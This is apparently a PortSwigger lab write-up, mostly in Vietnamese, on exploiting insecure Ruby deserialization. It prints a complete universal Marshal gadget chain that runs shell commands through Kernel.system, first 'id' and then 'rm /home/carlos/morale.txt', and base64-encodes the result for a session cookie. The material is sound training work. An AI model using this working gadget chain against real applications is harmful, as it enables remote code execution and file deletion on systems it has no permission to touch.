# Target Goal: 

To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

# Recon: 

Sau khi login, ta sẽ có session được cấp: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/97c9aa2d-8baa-446c-9705-cd9fa67a36c1)

Thử đem đi dcode sang b64 ta nhận thấy đây không phải là serialize của java và :

![image](https://github.com/vanniichan/Portswigger/assets/112863484/55d3c513-7d68-4012-8f8a-97ba00af8766)

Thay đổi cookie ta nhận được được phiên bản và loại data

![image](https://github.com/vanniichan/Portswigger/assets/112863484/7212365a-043b-4d0b-8356-fc450cb32579)

Như mô tả bài lab, chúng ta cũng không có tool để dùng mà chỉ có cách tìm tài liệu về vuln này với hint:
```
Try searching for "ruby deserialization gadget chain" online.
```
Tìm được 1 bài viết `Universal Deserialisation Gadget for Ruby 2.x-3.x` mặc dù bài lab giải được nhưng không hiểu sao ver 4.8 vẫn bị lỗi (Chăc do cố tình :)) )

Như payload CVE ta có thể thấy gadget chain thực hiện `id` như sau:
```
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```

Thay đổi bằng `rm /home/carlos/morale.txt` và chuyển nó sang b64 bằng `puts Base64.encode64(payload)`:

```
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Base64.encode64(payload)
```
![image](https://github.com/vanniichan/Portswigger/assets/112863484/967750c4-454e-40be-920b-81c0900c7865)

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/3eabd498-00f7-4894-ba34-e4b1fee97086)
